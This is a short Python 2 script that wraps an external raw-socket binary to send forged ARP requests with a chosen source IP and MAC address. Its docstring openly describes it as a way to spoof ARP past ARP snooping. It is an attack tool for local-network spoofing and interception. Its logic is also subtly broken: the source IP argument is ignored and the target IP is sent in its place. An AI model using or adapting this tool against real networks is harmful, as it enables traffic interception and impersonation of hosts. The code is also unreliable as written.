#!/usr/bin/python
import sys, time, re, threading
from executable import Executable

'''
        Sends an ARP Request given a source ip, source hw address and a target ip.
        Disregards the reply. Use to spoof arp for hosts with arp snooping on.
        If you use the same target ip and source ip, this looping program will
        be making gratuitous arp broadcasts.
'''
class ArpWithMacAddress(Executable):        
	arp_executable = "../bin/arp"
	
	def __init__(self, network_interface, src_ip, target_ip, mac_address):
		Executable.__init__(self, self.arp_executable)
		self.network_interface = network_interface
		self.src_ip = src_ip
		self.target_ip = target_ip
		self.mac_address = mac_address
		#print "# Setting up loop for arp spoofing " + target_ip + " (with " + src_ip + " on " + network_interface + ") "
			
	def execute(self):		 
		print "INTERFACE: " + self.network_interface + " SRC: " + self.target_ip + " Target: " + self.target_ip + " MAC: " + self.mac_address
		Executable.execute(self, self.network_interface, self.target_ip, self.target_ip, self.mac_address )
			
def main(argv):        
	if(len(argv) < 5):
		print "USAGE: arp-loop.py <interface> <src_ip> <target_ip> <MAC-Address>"
		print "Example: arp-loop.py eth0 192.168.1.67 192.168.1.82 C2:34:0F:20:04:CC"
		print                 
		exit()
	
	try:
		arlp = ArpWithMacAddress(argv[1],argv[2],argv[3], argv[4])
		arlp.execute()
	except IOError:        
		print "Missing C program to ping with. Make sure you've built the raw socket programs."
		exit(1)
	print "\nDone."
	
                

if __name__ == '__main__':
        main(sys.argv)
                
                
                
